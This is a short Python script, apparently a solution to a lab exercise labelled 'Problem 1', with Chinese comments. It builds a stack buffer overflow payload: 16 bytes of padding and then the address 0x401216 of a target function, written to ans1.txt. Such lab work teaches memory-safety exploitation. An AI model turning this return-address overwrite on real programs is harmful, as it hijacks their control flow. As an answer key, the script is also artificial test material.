import struct

# 目标地址: func1
func1_addr = 0x401216

# 偏移量: buffer(8) + saved_rbp(8) = 16
padding = b'A' * 16

payload = padding + struct.pack('<Q', func1_addr)

with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Problem 1 payload written to ans1.txt")
